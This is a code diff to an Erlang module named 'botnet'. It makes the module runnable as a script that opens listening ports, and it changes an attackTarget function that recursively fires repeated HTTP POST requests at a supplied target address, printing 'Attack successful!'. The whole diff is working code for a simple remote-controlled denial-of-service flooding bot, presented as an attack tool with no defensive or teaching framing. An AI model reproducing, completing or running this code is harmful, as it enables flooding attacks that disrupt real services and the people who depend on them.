@@ -1,5 +1,10 @@
+#!/usr/bin/env escript
+%% -*- erlang -*-
 -module(botnet).
 -export([connectionTestServer/1, do_recv/2, start/2, attackTarget/2, connectionTargetServer/1]).
+
+main(_) ->
+    start(2345, 2346).
 
 connectionTestServer(Port) ->
     {ok, LSock} = gen_tcp:listen(Port, [binary, {packet, 0},
@@ -25,8 +30,10 @@ attackTarget(TargetURI, 0) ->
 attackTarget(TargetURI, Times) ->
     ssl:start(),
     application:start(inets),
-    httpc:request(post, {TargetURI, [], "application/x-www-form-urlencoded", "bbbbbbbbbbb=aaaaaaaaaaaaaaaaaaaaaaaa"}, [], []),
-    attackTarget(TargetURI, Times - 1).
+    httpc:request(post, {"http://" ++ TargetURI, [], "application/x-www-form-urlencoded", "bbbbbbbbbbb=aaaaaaaaaaaaaaaaaaaaaaaa"}, [], []),
+    attackTarget(TargetURI, Times - 1),
+    io:fwrite("Attack successful!\n").
+    
 
 do_recv(Sock, Bs) ->
     case gen_tcp:recv(Sock, 0) of
